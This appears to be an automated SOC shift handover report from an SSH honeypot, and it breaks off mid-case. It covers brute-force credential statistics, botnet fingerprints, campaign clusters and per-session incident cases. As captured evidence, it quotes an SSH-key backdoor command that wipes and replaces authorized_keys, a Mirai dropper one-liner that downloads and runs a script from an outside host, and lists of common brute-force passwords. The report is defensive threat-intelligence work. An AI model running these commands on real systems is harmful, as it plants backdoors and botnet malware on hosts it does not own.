# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-11-26 |
| **Generated At** | 2026-11-26T05:52:53Z |
| **Shift Time** | 05:52 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **208** |
| Confirmed Threats | **180** |
| False Positives Filtered | **28** (13.5%) |
| Unique Attacker IPs | **86** |
| Countries of Origin | **27** |
| High Severity Cases | **142** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **66** |
| Malware Samples Analyzed | **9** HIGH · **27** MED · 0 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **1466** |
| Unique Credential Pairs | **1355** |
| Unique Usernames | **431** |
| Unique Passwords | **896** |
| Successful Auth Pairs | **1443** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 544 |
| `admin` | 67 |
| `ubuntu` | 39 |
| `user` | 25 |
| `deploy` | 23 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `123456` | 80 |
| `123` | 44 |
| `1234` | 36 |
| `12345678` | 23 |
| `root` | 21 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `rootssssss23424123123` | `rootssssss23424123123` | 18 |
| `root` | `root3245gs5662d34111111111` | 13 |
| `support` | `support` | 9 |
| `pi` | `abcd1234` | 6 |
| `git` | `git` | 5 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `Abc@2026` | `103.189.208.13` | 2026-11-26T00:01:08 |
| `rootssssss23424123123` | `rootssssss23424123123` | `103.189.208.13` | 2026-11-26T00:01:12 |
| `root` | `root3245gs5662d34111111111` | `103.189.208.13` | 2026-11-26T00:01:15 |
| `root` | `r@1234` | `124.43.10.224` | 2026-11-26T00:04:38 |
| `rootssssss23424123123` | `rootssssss23424123123` | `124.43.10.224` | 2026-11-26T00:04:43 |
| `root` | `root3245gs5662d34111111111` | `124.43.10.224` | 2026-11-26T00:04:48 |
| `steam` | `steam` | `213.135.168.228` | 2026-11-26T00:05:20 |
| `rootssssss23424123123` | `rootssssss23424123123` | `213.135.168.228` | 2026-11-26T00:05:23 |
| `steam` | `root3245gs5662d34111111111` | `213.135.168.228` | 2026-11-26T00:05:27 |
| `root` | `123412` | `186.38.26.5` | 2026-11-26T00:08:32 |
| `rootssssss23424123123` | `rootssssss23424123123` | `186.38.26.5` | 2026-11-26T00:08:35 |
| `root` | `root3245gs5662d34111111111` | `186.38.26.5` | 2026-11-26T00:08:37 |
| `root` | `PA55wOrd` | `112.219.151.50` | 2026-11-26T00:16:06 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:2323` | `147.185.133.134` | 2026-11-26T00:16:07 |
| `rootssssss23424123123` | `rootssssss23424123123` | `112.219.151.50` | 2026-11-26T00:16:10 |
| `root` | `root3245gs5662d34111111111` | `112.219.151.50` | 2026-11-26T00:16:16 |
| `hr` | `hr` | `121.229.191.90` | 2026-11-26T00:26:42 |
| `rootssssss23424123123` | `rootssssss23424123123` | `121.229.191.90` | 2026-11-26T00:27:08 |
| `root` | `12345@` | `117.218.75.251` | 2026-11-26T00:30:07 |
| `rootssssss23424123123` | `rootssssss23424123123` | `117.218.75.251` | 2026-11-26T00:30:11 |
_… 1423 more successful pair(s) in credentials.json_

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **208** |
| Sessions with Fingerprint | **19** |
| Unique HASSH Fingerprints | **19** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 101 |
| libssh | 36 |
| Unknown | 8 |
| Perl Net::SSH | 1 |
| PuTTY | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `2ec37a7cc8da...` | Mirai/variant | 81 | 3 |
| `f555226df196...` | Mirai/variant | 36 | 17 |
| `7d01d047ace6...` | Mirai/variant | 4 | 3 |
| `0a07365cc01f...` | Generic scanner | 4 | 1 |
| `eff4c24daffc...` | Modern SSH client | 3 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `2ec37a7cc8da...` | Go SSH scanner | 81 | 3 | Mirai/variant |
| `f555226df196...` | libssh | 36 | 17 | Mirai/variant |
| `95420f9d932d...` | Unknown | 5 | 5 | — |
| `7d01d047ace6...` | Go SSH scanner | 4 | 3 | Mirai/variant |
| `0a07365cc01f...` | Go SSH scanner | 4 | 1 | Generic scanner |
| `eff4c24daffc...` | Go SSH scanner | 3 | 1 | Modern SSH client |
| `16443846184e...` | Go SSH scanner | 3 | 3 | Generic scanner |
| `084386fa7ae5...` | Go SSH scanner | 2 | 2 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **88** |
| Campaign Clusters | **3** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1105, T1083, T1140, T1059.004` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 18 | 16 | `T1021.004, T1078, T1070, T1140` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1105, T1140, T1059.004` |

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
enable
```
```
linuxshell
```
```
system
```
```
sh
```
```
ls /home; /bin/busybox BOTNET
```
Source IPs: `160.119.66.206`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `189.190.183.204`, `186.38.26.5`, `20.127.185.37`, `213.135.168.228`, `72.240.125.133`, `124.43.10.224`

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
cd /tmp 2>/dev/null || cd /var 2>/dev/null || cd /dev/shm 2>/dev/null || cd /run 2>/dev/null || cd /root 2>/dev/null || cd /;rm -f kla.sh;wget -O kla.sh http://160.119.66.206/bins/kla.sh 2>/dev/null||busybox wget -O kla.sh http://160.119.66.206/bins/kla.sh 2>/dev/null||curl -sLo kla.sh http://160.119.66.206/bins/kla.sh 2>/dev/null;chmod 777 kla.sh;sh kla.sh telnet&
```
Source IPs: `160.119.66.206`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **86** |
| Unique ASNs | **40** |
| High-Risk ASNs | **30** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS0` |  | 33 | HIGH |
| `AS8075` | Microsoft Corporation | 4 | HIGH |
| `AS15169` | Google LLC | 4 | HIGH |
| `AS396982` | Google LLC | 4 | LOW |
| `AS63949` | Akamai Connected Cloud | 2 | HIGH |
| `AS6939` | Hurricane Electric LLC | 2 | HIGH |
| `AS398324` | Censys, Inc. | 2 | HIGH |
| `AS132359` | M/S ROBI TRADERS | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (138)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-0dfc6401e91f

| Field | Detail |
|---|---|
| **Source IP** | `103.189.208[.]13` |
| **First Seen** | 2026-11-26 00:01 |
| **Last Seen** | 2026-11-26 00:01 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-26 00:01:07` | `cowrie.session.connect` |
| `2026-11-26 00:01:07` | `cowrie.client.version` |
| `2026-11-26 00:01:07` | `cowrie.client.kex` |
| `2026-11-26 00:01:08` | `cowrie.login.success` |
| `2026-11-26 00:01:09` | `cowrie.session.params` |
| `2026-11-26 00:01:09` | `cowrie.command.input` |
| `2026-11-26 00:01:09` | `cowrie.command.failed` |
| `2026-11-26 00:01:10` | `cowrie.log.closed` |
| `2026-11-26 00:01:10` | `cowrie.session.params` |
| `2026-11-26 00:01:10` | `cowrie.command.input` |
| `2026-11-26 00:01:11` | `cowrie.session.file_download` |
| `2026-11-26 00:01:11` | `cowrie.log.closed` |
| `2026-11-26 00:01:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.189.208[.]13` to AbuseIPDB if not already reported
- [ ] Block `103.189.208[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fcb9cbf767c5

| Field | Detail |
|---|---|
| **Source IP** | `103.189.208[.]13` |
| **First Seen** | 2026-11-26 00:01 |
| **Last Seen** | 2026-11-26 00:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-26 00:01:11` | `cowrie.session.connect` |
| `2026-11-26 00:01:11` | `cowrie.client.version` |
| `2026-11-26 00:01:11` | `cowrie.client.kex` |
| `2026-11-26 00:01:12` | `cowrie.login.success` |
| `2026-11-26 00:01:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.189.208[.]13` to AbuseIPDB if not already reported
- [ ] Block `103.189.208[.]13` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7281d9bdfc9c

| Field | Detail |
|---|---|
| **Source IP** | `124.43.10[.]224` |
| **First Seen** | 2026-11-26 00:04 |
| **Last Seen** | 2026-11-26 00:04 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-26 00:04:37` | `cowrie.session.connect` |
| `2026-11-26 00:04:37` | `cowrie.client.version` |
| `2026-11-26 00:04:37` | `cowrie.client.kex` |
| `2026-11-26 00:04:38` | `cowrie.login.success` |
| `2026-11-26 00:04:39` | `cowrie.session.params` |
| `2026-11-26 00:04:39` | `cowrie.command.input` |
| `2026-11-26 00:04:39` | `cowrie.command.failed` |
| `2026-11-26 00:04:40` | `cowrie.log.closed` |
| `2026-11-26 00:04:41` | `cowrie.session.params` |
| `2026-11-26 00:04:41` | `cowrie.command.input` |
| `2026-11-26 00:04:41` | `cowrie.session.file_download` |
| `2026-11-26 00:04:41` | `cowrie.log.closed` |
| `2026-11-26 00:04:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `124.43.10[.]224` to AbuseIPDB if not already reported
- [ ] Block `124.43.10[.]224` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1a71acf3288c

| Field | Detail |
|---|---|
| **Source IP** | `124.43.10[.]224` |
| **First Seen** | 2026-11-26 00:04 |
| **Last Seen** | 2026-11-26 00:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-26 00:04:41` | `cowrie.session.connect` |
| `2026-11-26 00:04:41` | `cowrie.client.version` |
| `2026-11-26 00:04:42` | `cowrie.client.kex` |
| `2026-11-26 00:04:43` | `cowrie.login.success` |
| `2026-11-26 00:04:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `124.43.10[.]224` to AbuseIPDB if not already reported
- [ ] Block `124.43.10[.]224` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-719f03e219ec

| Field | Detail |
|---|---|
| **Source IP** | `213.135.168[.]228` |
| **First Seen** | 2026-11-26 00:05 |
| **Last Seen** | 2026-11-26 00:05 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-26 00:05:19` | `cowrie.session.connect` |
| `2026-11-26 00:05:19` | `cowrie.client.version` |
| `2026-11-26 00:05:19` | `cowrie.client.kex` |
| `2026-11-26 00:05:20` | `cowrie.login.success` |
| `2026-11-26 00:05:21` | `cowrie.session.params` |
| `2026-11-26 00:05:21` | `cowrie.command.input` |
| `2026-11-26 00:05:21` | `cowrie.command.failed` |
| `2026-11-26 00:05:21` | `cowrie.log.closed` |
| `2026-11-26 00:05:22` | `cowrie.session.params` |
| `2026-11-26 00:05:22` | `cowrie.command.input` |
| `2026-11-26 00:05:22` | `cowrie.session.file_download` |
| `2026-11-26 00:05:22` | `cowrie.log.closed` |
| `2026-11-26 00:05:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.135.168[.]228` to AbuseIPDB if not already reported
- [ ] Block `213.135.168[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ce853109725c

| Field | Detail |
|---|---|
| **Source IP** | `213.135.168[.]228` |
| **First Seen** | 2026-11-26 00:05 |
| **Last Seen** | 2026-11-26 00:05 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-26 00:05:22` | `cowrie.session.connect` |
| `2026-11-26 00:05:22` | `cowrie.client.version` |
| `2026-11-26 00:05:22` | `cowrie.client.kex` |
| `2026-11-26 00:05:23` | `cowrie.login.success` |
| `2026-11-26 00:05:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.135.168[.]228` to AbuseIPDB if not already reported
- [ ] Block `213.135.168[.]228` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f37d93c0da94

| Field | Detail |
|---|---|
| **Source IP** | `186.38.26[.]5` |
| **First Seen** | 2026-11-26 00:08 |
| **Last Seen** | 2026-11-26 00:08 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-26 00:08:31` | `cowrie.session.connect` |
| `2026-11-26 00:08:31` | `cowrie.client.version` |
| `2026-11-26 00:08:31` | `cowrie.client.kex` |
| `2026-11-26 00:08:32` | `cowrie.login.success` |
| `2026-11-26 00:08:33` | `cowrie.session.params` |
| `2026-11-26 00:08:33` | `cowrie.command.input` |
| `2026-11-26 00:08:33` | `cowrie.command.failed` |
| `2026-11-26 00:08:33` | `cowrie.log.closed` |
| `2026-11-26 00:08:34` | `cowrie.session.params` |
| `2026-11-26 00:08:34` | `cowrie.command.input` |
| `2026-11-26 00:08:34` | `cowrie.session.file_download` |
| `2026-11-26 00:08:34` | `cowrie.log.closed` |
| `2026-11-26 00:08:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.38.26[.]5` to AbuseIPDB if not already reported
- [ ] Block `186.38.26[.]5` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dea60d30114e

| Field | Detail |
|---|---|
| **Source IP** | `186.38.26[.]5` |
| **First Seen** | 2026-11-26 00:08 |
| **Last Seen** | 2026-11-26 00:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-26 00:08:34` | `cowrie.session.connect` |
| `2026-11-26 00:08:34` | `cowrie.client.version` |
| `2026-11-26 00:08:34` | `cowrie.client.kex` |
| `2026-11-26 00:08:35` | `cowrie.login.success` |
| `2026-11-26 00:08:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.38.26[.]5` to AbuseIPDB if not already reported
- [ ] Block `186.38.26[.]5` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-232c31d2936b

| Field | Detail |
|---|---|
| **Source IP** | `112.219.151[.]50` |
| **First Seen** | 2026-11-26 00:16 |
| **Last Seen** | 2026-11-26 00:16 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-26 00:16:05` | `cowrie.session.connect` |
| `2026-11-26 00:16:05` | `cowrie.client.version` |
| `2026-11-26 00:16:05` | `cowrie.client.kex` |
| `2026-11-26 00:16:06` | `cowrie.login.success` |
| `2026-11-26 00:16:07` | `cowrie.session.params` |
| `2026-11-26 00:16:07` | `cowrie.command.input` |
| `2026-11-26 00:16:07` | `cowrie.command.failed` |
| `2026-11-26 00:16:08` | `cowrie.log.closed` |
| `2026-11-26 00:16:08` | `cowrie.session.params` |
| `2026-11-26 00:16:08` | `cowrie.command.input` |
| `2026-11-26 00:16:08` | `cowrie.session.file_download` |
| `2026-11-26 00:16:08` | `cowrie.log.closed` |
| `2026-11-26 00:16:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.219.151[.]50` to AbuseIPDB if not already reported
- [ ] Block `112.219.151[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ddc9bd464a87

| Field | Detail |
|---|---|
| **Source IP** | `112.219.151[.]50` |
| **First Seen** | 2026-11-26 00:16 |
| **Last Seen** | 2026-11-26 00:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-26 00:16:09` | `cowrie.session.connect` |
| `2026-11-26 00:16:09` | `cowrie.client.version` |
| `2026-11-26 00:16:09` | `cowrie.client.kex` |
| `2026-11-26 00:16:10` | `cowrie.login.success` |
| `2026-11-26 00:16:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.219.151[.]50` to AbuseIPDB if not already reported
- [ ] Block `112.219.151[.]50` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-443b6f6cc74c

| Field | Detail |
|---|---|
| **Source IP** | `121.229.191[.]90` |
| **First Seen** | 2026-11-26 00:26 |
| **Last Seen** | 2026-11-26 00:31 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh` |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-26 00:26:41` | `cowrie.session.connect` |
| `2026-11-26 00:26:41` | `cowrie.client.version` |
| `2026-11-26 00:26:41` | `cowrie.client.kex` |
| `2026-11-26 00:26:42` | `cowrie.login.success` |
| `2026-11-26 00:26:43` | `cowrie.session.params` |
| `2026-11-26 00:26:43` | `cowrie.command.input` |
| `2026-11-26 00:26:43` | `cowrie.command.failed` |
| `2026-11-26 00:31:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.229.191[.]90` to AbuseIPDB if not already reported
- [ ] Block `121.229.191[.]90` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-04018da1425b

| Field | Detail |
|---|---|
| **Source IP** | `121.229.191[.]90` |
| **First Seen** | 2026-11-26 00:27 |
| **Last Seen** | 2026-11-26 00:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-26 00:27:06` | `cowrie.session.connect` |
| `2026-11-26 00:27:07` | `cowrie.client.version` |
| `2026-11-26 00:27:07` | `cowrie.client.kex` |
| `2026-11-26 00:27:08` | `cowrie.login.success` |
| `2026-11-26 00:27:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.229.191[.]90` to AbuseIPDB if not already reported
- [ ] Block `121.229.191[.]90` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0880732f4a5b

| Field | Detail |
|---|---|
| **Source IP** | `117.218.75[.]251` |
| **First Seen** | 2026-11-26 00:30 |
| **Last Seen** | 2026-11-26 00:30 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-26 00:30:06` | `cowrie.session.connect` |
| `2026-11-26 00:30:06` | `cowrie.client.version` |
| `2026-11-26 00:30:06` | `cowrie.client.kex` |
| `2026-11-26 00:30:07` | `cowrie.login.success` |
| `2026-11-26 00:30:08` | `cowrie.session.params` |
| `2026-11-26 00:30:08` | `cowrie.command.input` |
| `2026-11-26 00:30:08` | `cowrie.command.failed` |
| `2026-11-26 00:30:09` | `cowrie.log.closed` |
